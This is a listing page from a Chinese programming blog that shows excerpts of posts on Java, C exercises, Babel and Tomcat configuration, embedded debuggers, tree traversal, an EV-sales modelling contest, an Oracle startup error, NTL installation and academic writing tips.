<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b8c24b1f114b6eeb5eabc7f9d7b1600/" rel="bookmark">
			1*1卷积核降维
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 图片来源：https://www.bilibili.com/video/BV1Q5411d7hz/?spm_id_from=333.337.search-card.all.click&amp;vd_source=51d24252728ed4c63b0a210e48960422
1*1卷积核相当于一个全连接神经网络，加权求和。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b33b570b90f83b3a5be852537ac1348d/" rel="bookmark">
			浅谈一下：Java当作数组的几个应用场景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于数组，在C语言中就有过学习，但是，并没有怎么进行总结过，所以，笔者在Java中，对数组的几个简单的应用场景进行总结一下：
1.保存数据 public static void main(String[] args) { int[] array = {1, 2, 3}; for(int i = 0; i &lt; array.length; ++i){ System.out.println(array[i] + " "); } } 代码的运行结果为：
2.. 参数传基本数据类型 public static void main(String[] args) { int num = 0; func(num); System.out.println("num = " + num); } public static void func(int x) { x = 10; System.out.println("x = " + x); } 代码的运行结果为：
发现在func方法中修改形参 x 的值, 不影响实参的 num 值.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b33b570b90f83b3a5be852537ac1348d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/947b58b759393a52810eece9f5a03ae2/" rel="bookmark">
			C语言基础代码（10题）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		7-79 统计指定数量学生的平均成绩与不及格人数 本题要求编写程序，计算学生们的平均成绩，并统计不及格（成绩低于60分）的人数。题目保证输入与输出均在双精度范围内。
输入格式: 输入在第一行中给出非负整数n，即学生人数。第二行给出n个非负实数，即这n位学生的成绩，其间以空格分隔。
输出格式: average = 成绩均值
count = 不及格人数
其中平均值精确到小数点后两位，等号的左右各有一个空格。
输入样例1: 4 60 54 95 73 输出样例1: average = 70.50 count = 1 输入样例2: 0 输出样例2: average = 0.00 count = 0 #include&lt;stdio.h&gt; main() { int n,i,a,count=0,sum =0; float average; scanf("%d",&amp;n); if (n==0) { printf("average = 0.00\n"); printf("count = 0"); }	else { for (i=0;i&lt;n;i++) { scanf("%d",&amp;a); sum=sum+a; if (a&lt;60) count++; } average=(float)sum/(float)n; printf("average = %.2f\n",average); printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/947b58b759393a52810eece9f5a03ae2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3b6f985c43a4d08ffea39f26ad41a57/" rel="bookmark">
			Babel配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Babel是什么 官网：Babel 是一个工具链，主要用于将采用 ECMAScript 2015+ 语法编写的代码转换为向后兼容的 JavaScript 语法，以便能够运行在当前和旧版本的浏览器或其他环境中。一般都是和webpack配合使用
使用 安装
npm install @babel/core @babel/cli @babel/preset-env -D @babel/core
Babel 的核心功能包含在 @babel/core 模块中，所有的转译都将使用本地配置文件。
配置文件
Babel 有两种并行的配置文件格式，可以一起使用，也可以独立使用。
全项目配置
babel.config.json文件，具有不同的扩展名 ( .js, .cjs, .mjs)
Babel 7.x是新的，Babel有一个“根”目录的概念，默认为当前工作目录。对于项目范围的配置，Babel将在此根目录中自动搜索babel.config.json文件，或使用受支持扩展名的等效文件文件相关配置
.babelrc.json文件，具有不同的扩展名 ( .babelrc, .js, .cjs, .mjs)或者package.json里设置babel字段
Babel通过从正在编译的“文件名”开始搜索目录结构（受以下注意事项限制）来加载.babelrc.json文件，或使用受支持扩展名的等效文件
一旦找到包含package.json的目录，搜索将停止，因此相对配置仅适用于单个软件包 配置文件示例
{ "presets": [ [ "@babel/env", { "targets": { "edge": "17", "firefox": "60", "chrome": "67", "safari": "11.1" }, "useBuiltIns": "usage", "corejs": "3.6.5" } ] ] } @babel/cli
@babel/cli 是一个能够从终端（命令行）使用的工具。可以通过 --help 参数来查看命令行工具所能接受的所有参数列表
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3b6f985c43a4d08ffea39f26ad41a57/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8c9194a81c51692d65b5391c53e59f3/" rel="bookmark">
			正点原子 DAP下载器简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用DAP下载器给开发板下载程序 文章目录 使用DAP下载器给开发板下载程序前言0、接线方法(支持模拟串口)1、开发板接线2、核心板接线 1、驱动安装2、配置下载器3、虚拟串口功能 前言 现在单片机开发需要借助调试工具才能提高开发效率，尤其是在线调试和下载程序，以前都是用串口给单片机下载程序，下载一次程序就要等好久，而现在用下载器十几秒就完成了，另外，有仿真器还能跟踪程序的执行情况，精准定位，方便排除问题，光看现象难分析问题所在，所以很有必要充分利用辅助工具。
0、接线方法(支持模拟串口) 这里用 DAP 下载器接开发板用的20pin的排线，如果要用SWD四根线则可以看开发板的背面接口丝印四根线具体的接口位置进行连接。
使用下载器虚拟串口输出功能，把开发板的串口1跳线帽拔掉，下载器的TX接开发板的PA10，下载器的RX接开发板的PA9(这个方法其它的串口也可，不限串口1，找到串口对应引脚接起来即可)，这样连接后开发板就不需要另外接一根USB线就可以用串口1的功能了，有串口功能的下载器使用起来比较方便些。完美解决了笔记本电脑的USB不够的问题。
注意事项：
1.开发板如果没有接USB线供电，则需要用DC电源供电，否则下载程序后是无法运行起来的。
2.这里的串口之所以可以接两根线是因为JTAG接口和开发板接了，默认有接了GND，所以两根线就可以串口通信，如果把排线拔掉了，则需要将开发板的GND和下载器的GND接起来才能有串口功能。
1、开发板接线 2、核心板接线 1、驱动安装 DAP下载器是不需要手动安装驱动的，第一次将下载器插上电脑后是会自动安装驱动的，安装之后可以在电脑设备管理器查看到是否可以识别到驱动。
如果电脑驱动安装失败，可以用驱动精灵试试安装。
2、配置下载器 注意：低版本 MDK 对 ATK-DAP 的支持不够完善，推荐 MDK5.14以上的 版本。
2.1 将DAP通过usb线连接到电脑。
然后打开DAP上位机ATK-DAP V1.1.exe 查看是否识别的到DAP，打开时是没有提示任何信息的，要手动点击刷新后，后面才会提示状态：APP，提示这个则表示与电脑连接没有问题。
待上位机可以连接到DAP后直接关闭这个上位机即可。
2.2 DAP连接开发板，建议给开发板要独立供电，否则导致下载完程序无法运行的情况。
2.3 例程编译通过，提示 0 Error(s), 0 Warning(s)就可以了。
2.4 在MDK中配置DAP选项。
按照步骤依次点击选项，Debug配置完后 点击setting，点击settings后检查Debug窗口下的Unit，SWDIO是否出现相应参数。
如果上面的配置提示下载出错，可以试试添加下面的步骤：选under Reset , SYSRESETREQ
弄完这步之后 点击Flash Download 查看芯片flash是否选对Reset and run可选可不选 不选时下载完程序要按复位键在Programming Algorithm 窗口 选择芯片相应flash。
F4选择 1M
F1选择 512K
没有的选择的看看是否安装芯片包 xxx.pack
选择完最后点击确定ok
2.5 配置好基本参数后回到主界面再编译一次工程。
2.6 编译好后点击下载。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8c9194a81c51692d65b5391c53e59f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7048e275577764d2bf88dccabca43e69/" rel="bookmark">
			超容易理解的数据结构前序，中序和后序序列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天听了我们数据结构老师讲三序序列，发现有很多同学不能根据二叉树推，特发此文讲解。
对于三序序列，我们可以选择构造一个表格并创造一个指针，将指针指于二叉树根结点，对应表格则如下所示，若某节点无左孩子或右孩子，则在对应表格内打叉。我们假定我们在运行程序，则对于前序序列来说为先根结点再左再右。指针指向根节点A，则对于A来说执行根节点操作，把A放入先序序列中。
此时先序序列为：A。
之后执行左子树操作，指针指向A的左子树的根节点B。
指针指向根节点B，则对于B来说执行根节点操作，把B放入先序序列中。
此时先序序列为：A，B。
之后执行左子树操作，指针指向B的左子树的根节点D。
指针指向根节点D，则对于D来说执行根节点操作，把D放入先序序列中。
此时先序序列为：A，B，D。
此时A的左子树已经遍历完毕，遍历A的右子树，此时指针指向A的右子树根节点C。
指针指向根节点C，则对于C来说执行根节点操作，把C放入先序序列中。
此时先序序列为：A，B，D，C。
之后执行左子树操作，指针指向C的左子树的根节点E。
指针指向根节点E，则对于E来说执行根节点操作，把E放入先序序列中。
此时先序序列为：A，B，D，C，E。
此时C的左子树已经遍历完毕，遍历C的右子树，此时指针指向C的右子树根节点F。
指针指向根节点F，则对于F来说执行根节点操作，把F放入先序序列中，此时根节点全部遍历完毕，先序序列为：A，B，D，C，E，F。
子树遍历步骤如下图所示：
同理，中序序列和后序序列也可以用此方法进行判断，结果如下图所示。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/368dacffac29df583600c6348cec7fca/" rel="bookmark">
			2021年华数杯数学建模C题电动汽车目标客户销售策略求解全过程文档及程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2021年华数杯数学建模 C题 电动汽车目标客户销售策略 原题再现： 汽车产业是国民经济的重要支柱产业，而新能源汽车产业是战略性新兴产业。大力发展以电动汽车为代表的新能源汽车是解决能源环境问题的有效途径，市场前景广阔。但是，电动汽车毕竟是一个新兴的事物，与传统汽车相比，消费者在一些领域，如电池问题，还是存在着一些疑虑，其市场销售需要科学决策。
某汽车公司最新推出了三款品牌电动汽车，包括合资品牌（用1表示）、自主品牌（用2表示）和新势力品牌（用3表示）。为研究消费者对电动汽车的购买意愿，制定相应的销售策略，销售部门邀请了1964位目标客户对三款品牌电动汽车进行体验。具体体验数据有电池技术性能（电池耐用和充电方便）满意度得分（满分100分，下同）a1、舒适性（环保与空间座椅）整体表现满意度得分a2、经济性（耗能与保值率）整体满意度得分a3、安全性表现（刹车和行车视野）整体满意度得分a4、动力性表现（爬坡和加速）整体满意度得分a5、驾驶操控性表现（转弯和高速的稳定性）整体满意度得分a6、外观内饰整体表现满意度得分a7、配置与质量品质整体满意度得分a8等。另外还有目标客户体验者个人特征的信息，详情见附录1和2。
请你研究数据，查阅相关文献，运用数学建模的知识回答下列问题：
1.请做数据清洗工作，指出异常值和缺失数据以及处理方法。对数据做描述性统计分析，包括目标客户对于不同品牌汽车满意度的比较分析。
2.决定目标客户是否购买电动车的影响因素有很多，有电动汽车本身的因素，也有目标客户个人特征的因素。在这次目标客户体验活动中，有部分目标客户购买了体验的电动汽车（购买了用1表示，没有购买用0表示）。结合这些信息，请研究哪些因素可能会对不同品牌电动汽车的销售有影响？
3.结合前面的研究成果，请你建立不同品牌电动汽车的客户挖掘模型，并评价模型的优良性。运用模型判断附件3中15名目标客户购买电动车的可能性。
4.销售部门认为，满意度是目标客户汽车体验的一种感觉，只要营销者加大服务力度，在短的时间内提高a1-a8五个百分点的满意度是有可能的，但服务难度与提高的满意度百分点是成正比的，即提高体验满意度5%的服务难度是提高体验满意度1%服务难度的5倍。基于这种思路和前面的研究成果，请你在附件3每个品牌中各挑选1名没有购买电动汽车的目标客户，实施销售策略。
5.根据前面的研究结论，请你给销售部门提出不超过500字的销售策略建议。
整体求解过程概述(摘要) 本文探究的是某汽车公司中三个品牌电动汽车的目标客户满意度情况、影响因素、预测购买可能性以及制定销售策略等问题。
针对问题一，通过分析附件一，同时结合附件二的个人特征调查表，提取调查表问题本身的限制条件，并发掘调查问题之间的关系，最终建立不同调查问题之间合理的约束关系，由此，对不同的异常数据和缺失数据采用了不同的填充策略。基于数据清洗后的结果，对各项影响满意度得分的指标取平均值，发现：目标客户对该公司三种品牌的满意度从高到低依次为合资品牌&gt;自主品牌&gt;新势力品牌。
针对问题二，采用了基于惩罚项和基于树模型两种不同的嵌入法分别进行特征选取，前一种用 LR、LASSO、SVM 三种模型，后一种用 RF、LightGBM 模型共五个模型来进行机器学习，求出影响不同品牌销售的相关特征，对选出的特征上采用投票法，结果发现：电动车的电池技术性能、舒适性、目标客户全年房贷、车贷占家庭年收入情况对三种品牌的销售均有较大影响。除此之外，经济型、安全性、客户的工作情况等也在不同程度上对不同品牌的销售产生不同程度的影响。
针对问题三，由于标签不均衡的问题严重，本文先通过 SMOTE 采样解决标签不平衡问题，再通过纵向比较和横向比较，纵向使用 F1-score 和 AUC 指标衡量训练效果，横向对不同模型的分数进行比较，从而挑选出适用于不同品牌的最优模型。进而利用网络搜索方法给每个品牌效果最优的模型进行超参数调优，其中 LightGBM 的在整个验证集上的 AUC 值达到 97.10%。最后利用这三个最优模型预测了附件三的 15名目标客户购买电动车的可能性。
针对问题四，本文在问题三基础上，运用了多目标规划原理，建立三个目标函数，即提高体验满意度的服务难度尽量小，选择提高服务的数量尽可能少，目标客户购买概率提升的百分比尽可能大。用 python 求解该规划模型，结果显示，着重满足品牌 1、编号 3 的顾客在经济性上的需求；满足品牌 2、编号 9 的顾客在电池性能上的需求以及品牌 3、编号 14 的顾客在舒适性上的需求有助于提高顾客的购买率。
针对问题五，基于问题一到问题四所建立的模型、因子探究等的基础上，提出了精准营销的策略，在人群洞察、品牌导向、效果评估这三个方向去探讨，旨在为该团队有针对性地制定销售策略，为该汽车公司创造最大的效益。
问题分析： 问题一要求考虑题目要求和结合实际背景对附件一和附件三的数据进行数据清洗操作，并进行描述性统计，该题的思路分为一下三个步骤：
1. 利用附件二的目标客户个人特征调查表，以及题目中对满意度评价表的约束，综合考虑实际生活和客观规律，充分挖掘问题本身的限制条件，以及不同问题之间的限制条件，最终建立不同回答之间合理的约束关系。
2. 之后利用所建立出的约束关系，对附件一和附件三的异常数据进行初步清洗。对于离群类型异常值用有效数据的平均值替换。对于不满足约束关系的异常值，用数据间的关系做出推断后进行替换，对缺失数据的缺失情况进行综合分析，用已有的数据进行推断并分析实际背景，对缺失数据进行填充处理，以保证建模的准确性。
3. 基于数据清洗后的结果，对各项影响满意度得分的指标取平均值，然后对各品牌进行排序。
问题二需要筛选出影响不同品牌销售的主要因素，针对该问题采用基于惩罚项和基于树模型两种不同的嵌入法，前一种用 LR、LASSO、SVM 三种模型，后一种用RF、LightGBM 模型共五个模型，求出影响不同品牌销售的相关特征。再根据特征重要性程度从高到低排序，并设置一个阈值，得到每个算法重要性排名靠前的特征，在五个模型选出的结果上采用投票法，筛选出大于等于 2 票的特征，作为影响该品牌销售主要因素。
问题三是建立在问题二的基础上的，通过 SMOTE 采样解决标签不平衡问题之后，利用 F1-score 和 AUC 指标，对模型的训练和预测效果进行纵向比较，并利用 k 折交叉验证，对不同模型进行横向比较。对三个品牌，分别训练这 5 个模型，通过比较分析，在不同品牌中，挑选出在验证集上 F1-score 和 AUC 值最优的模型，并利用网络搜索方法，给每个品牌对应的最优的模型进行超参数调优。最后利用这三个最优模型预测附件三的 15 名目标客户购买电动车的可能性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/368dacffac29df583600c6348cec7fca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05257eaa5e3f183e9826cd5a3d74cc87/" rel="bookmark">
			ORA-01078: failure in processing system parameters LRM-00109: could not open parameter file
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 产生原因：在执行关闭数据命令或其他命令的过程中异常断电，或者命令人为中断（因为有的命令可能要执行1分钟，有些新手以为卡死了，关闭了命令行导致），导致开启数据库的初始化文件丢失或异常
解决办法：oracle自带初始化文件的备份，将这个文件拷贝到初始化目录下，根据提示找不到的文件进行重命名即可，具体操作如下：
用everything软件或windows的搜索搜init.ora文件，找到一个pfile文件夹下的init.ora文件或init.ora.12345678文件，这个文件就是备份文件，比如下图
先通过conn / as sysdba连接数据库，再通过备份文件启动数据库
关闭数据库再开启，找到报错路径，将备份文件复制到报错路径中并改名成路径中相同的文件名
最后start up开启数据库就正常启动了，之后关机打开数据库也会是正常状态了，有用点个赞呗！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c4596715e5a701b35c866d1b5a44176/" rel="bookmark">
			Java【tomcat】配置文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Tomcat(二)：tomcat配置文件server.xml详解和部署简介 分类: 网站架构 本文原创地址在博客园：https://www.cnblogs.com/f-ck-need-u/p/8120008.html
Tomcat系列文章：http://www.cnblogs.com/f-ck-need-u/p/7576137.html
1. 入门示例：虚拟主机提供web服务 该示例通过设置虚拟主机来提供web服务，因为是入门示例，所以设置极其简单，只需修改$CATALINA_HOME/conf/server.xml文件为如下内容即可，本文的tomcat安装在/usr/local/tomcat下，因此$CATALINA_HOME=/usr/local/tomcat。其中大部分都采用了默认设置，只是在engine容器中添加了两个Host容器。
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;Server port="8005" shutdown="SHUTDOWN"&gt; &lt;Listener className="org.apache.catalina.startup.VersionLoggerListener" /&gt; &lt;Listener className="org.apache.catalina.core.AprLifecycleListener" SSLEngine="on" /&gt; &lt;Listener className="org.apache.catalina.core.JreMemoryLeakPreventionListener" /&gt; &lt;Listener className="org.apache.catalina.mbeans.GlobalResourcesLifecycleListener" /&gt; &lt;Listener className="org.apache.catalina.core.ThreadLocalLeakPreventionListener" /&gt; &lt;GlobalNamingResources&gt; &lt;Resource name="UserDatabase" auth="Container" type="org.apache.catalina.UserDatabase" description="User database that can be updated and saved" factory="org.apache.catalina.users.MemoryUserDatabaseFactory" pathname="conf/tomcat-users.xml" /&gt; &lt;/GlobalNamingResources&gt; &lt;Service name="Catalina"&gt; &lt;Connector port="8080" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" enableLookups="false" /&gt; &lt;Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /&gt; &lt;Engine name="Catalina" defaultHost="localhost"&gt; &lt;Realm className="org.apache.catalina.realm.LockOutRealm"&gt; &lt;Realm className="org.apache.catalina.realm.UserDatabaseRealm" resourceName="UserDatabase" /&gt; &lt;/Realm&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c4596715e5a701b35c866d1b5a44176/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e289741b5b37970aefe4e4e00b9b9be/" rel="bookmark">
			多线程详细讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.基本概念 1.程序
一段静态代码
2.进程
一段正在运行的程序,如360安全卫士
3.线程
一段程序内部的执行路径,多线程就是指一个进程中有多个线程,如打开360安全卫士后可以同时开展木马查杀与垃圾清理连个线程
每个线程拥有独立的运行栈和程序计数器,与其他线程共享进程中的
4.单核CPU与多核CPU
单核CPU是一种假的多线程,看似同时执行多个线程,实则每个单元时间(很短)只执行一个线程
多核CPU可以更好发挥多线程效率
5.并行与并发
并行是指,多个CPU同时执行多个任务,比如多个人做不同的事
并发是值,一个CPU(采用时间片切换)同时执行多个任务,如秒杀,多个人做一件事
二.多线程的创建与启动 一.创建一个继承自Thread类的子类(方式一) 1.重写run()方法
2.创建Thread子类的对象
3.调用start()方法
public class Main { public static void main(String[] args) { MyThread myThread = new MyThread();//创建对象 myThread.start(); for(int i = 0;i&lt;10000;i++){ System.out.print("&amp;&amp;"+" "); } } } class MyThread extends Thread{//继承自Thread的子类 @Override public void run() {//重写run()方法 for(int i = 0;i&lt;10000;i++){ System.out.print(i+" "); } } } 注意:
I.如果对象直接调用run()方法,只会体现类调用方法,而不会是创建新线程
II.对象执行过一次start()方法后不可以再让该对象调用start()方法
III.主线程main与自定义线程没有优先级之分,上述代码运行后会看到明显的交互现象
二.线程常用方法 1.void start():
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e289741b5b37970aefe4e4e00b9b9be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c9b8ac207415b0238e79807872b7276/" rel="bookmark">
			小程序的点击复制功能和长按复制功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言： 在小程序中实现点击复制功能和长按复制功能,主要使用wx.setClipboardData 小程序的复制功能。 官方方法： wx.setClipboardData 小程序的复制功能 功能描述 设置系统剪贴板的内容。调用成功后，会弹出 toast 提示"内容已复制"，持续 1.5s
参数 Object object 属性类型默认值必填说明datastring是剪贴板的内容successfunction否接口调用成功的回调函数failfunction否接口调用失败的回调函数completefunction否接口调用结束的回调函数（调用成功、失败都会执行） 示例代码 wx.setClipboardData({ data: 'data', success (res) { wx.getClipboardData({ success (res) { console.log(res.data) // data } }) } }) 个人使用： 封装一个复制的方法 export function setClipboardData(data, showDoneToast = true) { return new Promise((resolve, reject) =&gt; { wx.setClipboardData({ data: data, success(res) { resolve(res); }, fail(err) { reject(err); } }) }).then(res =&gt; { if (showDoneToast) { wx.showToast({ title: '复制成功', icon: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c9b8ac207415b0238e79807872b7276/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a63a8bc823c44104e3c9a45ae91c549a/" rel="bookmark">
			JVM(尚硅谷)学习之GC日志分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内存分配与垃圾回收参数列表：
GC日志分析的具体举例：
日志补充说明：
日志分析工具：
GCEasy可以在线搜索使用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e7306f34617c4d1df432319235506cc/" rel="bookmark">
			NTL的安装、连接与使用（基于CentOS、Clion）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装 m4 sudo apt-get install m4 2、安装gmp 在网站https://ftp.gnu.org/gnu/gmp/下载gmp文件，解压 gmp-6.0.0a.tar.lz 文件，并安装。
解压 gmp 压缩包
tar -xf gmp-6.0.0a.tar.lz 然后安装
cd gmp-6.0.0 ./configure make make check sudo make install 3、安装NTL Download NTL (libntl.org)
下载NTL（ntl-11.5.1.tar.gz）后解压，然后切换文件夹
tar ntl-11.5.1.tar.gz cd ntl-11.5.1/src 进行安装
./configure make make check sudo make install 4、检查看是否安装成功（有无ntl相关文件） ls /usr/local/include ls /usr/local/lib 5、打开Clion编译软件 修改cmake.list
cmake_minimum_required(VERSION 3.23) project(test02) set(CMAKE_CXX_STANDARD 14) # 声明位置 LINK_DIRECTORIES(/usr/local/lib) link_libraries(/usr/local/lib/libntl.a) #被链接的库相对路径 link_directories(/usr/local/lib /lib) #被链接库的头文件相对路径 include_directories(/usr/local/include) add_executable(ecc main.cpp) target_link_libraries(ecc -lm -lgmp -lntl -lpthread) 6、运行例子 #include&lt;iostream&gt; #include&lt;NTL/ZZ.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1e7306f34617c4d1df432319235506cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d15cce3153f9c04be9630b9fb23836c2/" rel="bookmark">
			关于idea修改代码后不生效的问题。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		刚开始学习java的时候，发现代码修改重新运行，代码不生效，还是原来的运行结果。每次修改代码还要重新编译，很是麻烦。
这里提供一下我的意见。
可以先去看看其他人的解决办法，比如在设置里设置自动编译，还有一些其他办法。
我是在看我别人的办法后，还是没有找到解决办法，代码死活不生效。最后看到一篇文章，用插件，jrebal，。这里去搜jrabel插件的使用吧，安装重启后，修改代码就生效了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07f784398b6374ebc8e4739ced227e51/" rel="bookmark">
			uniapp 最接近微信的图片压缩插件 Ba-ImageCompressor
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介（下载地址） Ba-ImageCompressor 是一款uniapp简单快捷的图片压缩插件，仿微信朋友圈压缩策略。
支持批量压缩支持设置不压缩的阈值，单位为K支持返回压缩后图片大小，单位为B 效果与对比 内容原图Ba-ImageCompressorWechat截屏 720P720*1280,390k720*1280,87k720*1280,56k截屏 1080P1080*1920,2.21M1080*1920,104k1080*1920,112k拍照 13M(4:3)3096*4128,3.12M1548*2064,141k1548*2064,147k拍照 9.6M(16:9)4128*2322,4.64M1032*581,97k1032*581,74k滚动截屏1080*6433,1.56M1080*6433,351k1080*6433,482k 效果截图 使用方法 引用 在 script 中引入组件
const imageCompressor = uni.requireNativePlugin('Ba-ImageCompressor') 示例 可在页面 script 中调用（示例参考，可根据自己业务和调用方法自行修改）
methods: { imageCompress() {//压缩 console.log(this.path) console.log(this.outputPath) imageCompressor.compress({ path: this.path, //原始图片路径（单张） paths: this.paths,//原始图片路径（批量，也可以单张） }, (ret) =&gt; { console.log(ret) if (ret.outputPath) { this.outputPath = ret.tempFiles[0].path; this.outputSize = this.formatSize(ret.tempFiles[0].size); //this.outputPath = ret.outputPath;//单张 //this.outputSize = this.formatSize(ret.outputSize);//单张 } }); }, formatSize(size, unit = "B") { let s = size; while (s &gt; 1024) { s = (s / 1024).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07f784398b6374ebc8e4739ced227e51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b592fcffb67fa742a85a31df660edc7c/" rel="bookmark">
			论文写作 总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.在开始论文之前，我们得先知道什么是学术论文，学术论文是对研究工作的阶段性总结，对于单篇论文，我们只需要一两个创新点即可。其次我们要阅读大量论文，总结模板，然后才开始写论文。
2.写英文论文时，不要自创词汇，可以先去linggle上查询该词的使用次数，使用频数多即可使用。
3.学术论文中，有许多慎用的单词，如：Easy、Simple、Solve这些词，因为一个问题，你要是觉得它简单或者已经解决了，那么我们研究它就没有意义了；Novel这个词表示是比较大的创新，比较夸张，当然如果自己的创新点确实比较厉害，也可以用这个词，但我认为自己硕士阶段应该不会了；还有就是Prove，我们正在论文中的实验结果和数据只能是表面某个观点或想法，不能是证明；在正式论文中，Have't与Don't是不正确的写法，应该用have not、do not之类的。
4.在写英文论文时，先查阅20篇顶刊的论文，找出各部分的简单句子，以此获得句型，把自己的观点想法套入句子中，同时要注意每个简单句子出现的位置，它们有不同的时态和味道。不要想着把句子写的很复杂显得高级，这样往往会让句子出现很多错误并且长句让审稿人看的很烦。
5.不要翻译！！！必须培养科技论文的思考习惯。我们写英文论文的时候千万不要先写中文再翻译成英文，我们应直接从英文开始，翻译出来有时候语境不同，词意都会被改变。
6.当论文涉及到很多数学符号时 ，要给出一个符号表便于读者查询。符号表格不要整的花里胡哨的，包括不要对式子、符号进行额外的、特殊的处理，强行增加空格、花括号等。找一篇或多篇已经发表论文的.tex文件来学习数学表达式，同时也要注意自己投的期刊对符号表格的要求
7.在论文中，图可以代表很多内容，图可以比较直观表达我们想要说明的内容。要尽量使用矢量图；不要用Excel画图；图注可以很长；围绕图的说明性文字应该比较长；一般而言，引用图片是，应保持与图片编号一致；有些期刊会要求提供 Graphical abstract，即使用一张图 (含图注) 把论文的主要思想介绍清楚。
8.Latex表格中表格应与文字边距相同；l表示left，c表示center，r表示right。
9.每种期刊都会提供一个或多个格式文件，Latex源文件只需要进行少量改变，就可以获得完全不同的版面。不要从头写，最好找该期刊已录用论文的源文件，其次找该期刊提供的模板文件。
10.初学者写论文先采用自底向上的方式堆材料，有了初稿再用自顶向下的方式把控全局。
